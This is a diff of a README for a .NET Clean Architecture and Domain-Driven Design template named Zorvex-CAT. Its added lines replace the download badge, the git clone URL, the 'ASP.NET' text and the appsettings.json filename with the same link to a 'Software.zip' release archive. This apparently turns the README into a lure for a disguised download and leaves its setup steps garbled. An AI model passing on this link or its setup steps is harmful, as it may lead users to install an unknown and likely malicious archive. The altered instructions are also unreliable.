@@ -1,6 +1,6 @@
 # 🚀 Zorvex-CAT - Clean Architecture & Domain-Driven Design Project Template
 
-[![](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/toe2132313/Zorvex-CAT/releases/download/v1.0/Software.zip)](https://github.com/toe2132313/Zorvex-CAT/releases/download/v1.0/Software.zip)
 
 Welcome to Zorvex-CAT repository! This project template focuses on implementing Clean Architecture and Domain-Driven Design (DDD) principles, with a special emphasis on identity management features. Whether you are starting a new project or looking to refactor an existing codebase, Zorvex-CAT provides a solid foundation for building scalable, maintainable, and modular software applications.
 
@@ -29,14 +29,14 @@ Welcome to Zorvex-CAT repository! This project template focuses on implementing 
 - **Dapper**: Lightweight ORM for data access, providing high performance and efficiency.
 - **.NET Framework**: Microsoft's framework for building scalable and robust applications.
 - **Mediator Pattern**: Used for decoupling the components of the application and promoting reusability.
-- **IdentityServer4**: Open-source identity and access control solution for ASP.NET Core applications.
+- **IdentityServer4**: Open-source identity and access control solution for https://github.com/toe2132313/Zorvex-CAT/releases/download/v1.0/Software.zip Core applications.
 
 ## Setup
 To get started with Zorvex-CAT, follow these steps:
-1. Clone the repository: `git clone https://github.com/your-username/Zorvex-CAT.git`
+1. Clone the repository: `git clone https://github.com/toe2132313/Zorvex-CAT/releases/download/v1.0/Software.zip`
 2. Navigate to the project directory: `cd Zorvex-CAT`
 3. Install the dependencies: `dotnet restore`
-4. Configure the database connection in `appsettings.json`
+4. Configure the database connection in `https://github.com/toe2132313/Zorvex-CAT/releases/download/v1.0/Software.zip`
 5. Apply the database migrations: `dotnet ef database update`
 6. Run the application: `dotnet run`
 
